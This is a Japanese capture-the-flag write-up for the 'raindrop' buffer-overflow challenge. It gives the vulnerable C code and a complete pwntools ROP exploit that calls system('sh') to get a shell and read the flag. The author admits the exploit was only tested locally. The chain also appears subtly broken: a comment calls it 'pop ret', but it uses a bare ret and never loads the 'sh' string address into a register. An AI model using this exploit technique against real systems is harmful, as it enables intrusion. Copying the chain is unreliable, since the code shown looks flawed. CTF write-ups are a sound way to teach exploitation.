# raindrop

ローカルで動かしたため、動作の保証はしません。

## Description

53 solves, 134 pt

author:n01e0

おぼえていますか?

## writeup

```bash
$ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cba1707049faf8a4e56b2adfe2b8e9813e087e12, for GNU/Linux 3.2.0, not stripped
$ checksec --file ./chall
[*] '/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

system関数が用意されているため、ROPでsystem("/bin/sh");を実行しようと思いましたが、"/bin/sh"がありません。そこで文字列の"finish"の"sh"を使えば良いと判断しました(system("sh");)。

```c
#define BUFF_SIZE 0x10

void help() {
    system("cat welcome.txt");
}
int main() {
    vuln();
}

void vuln() {
    char buf[BUFF_SIZE] = {0};
    show_stack(buf);
    puts("You can earn points by submitting the contents of flag.txt");
    puts("Did you understand?") ;
    read(0, buf, 0x30);
    puts("bye!");
    show_stack(buf);
}
```

ROPチェインを組む材料を揃えます。アドレスは静的解析で求めました。

```
pop ret: rop.find_gadget(['ret'])[0]
sh: 0x4020f4(0x4020f0: finish -> 0x4020f4: s, 0x4020f6: h) または、next(elf.search(b'sh\0'))
call system: 0x4011e5
```

A埋めは0x19個でセグフォとなったので、0x18個で埋めました。

```python
from pwn import *

binfile = "./chall"
context.binary = binfile
context.log_level = 'critical'
elf = ELF(binfile)

help = elf.symbols['help']

HOST='raindrop.quals.beginners.seccon.jp'
PORT=9001
io = process(binfile)
# io = remote(HOST, PORT)

rop = ROP(elf)
rop.raw(rop.find_gadget(['ret'])[0]) # pop ret
rop.raw(pack(next(elf.search(b'sh\0'))))  # sh
rop.raw(pack(0x4011e5)) # call system

# "A"*0x19: segmentation fault
payload = b"A"*0x18  + rop.chain()

io.sendlineafter(b'?', payload)

io.sendline(b'echo exploited')
io.sendlineafter(b'exploited\n', b'cat flag.txt')

print(io.readline().decode('utf-8', 'ignore'), end='')
```

## FLAG

不明

## REF

https://feneshi.co/ctf4b2022writeup/#raindrop

https://qiita.com/kusano_k/items/963b299d1b33b97270b9#raindrop-easy
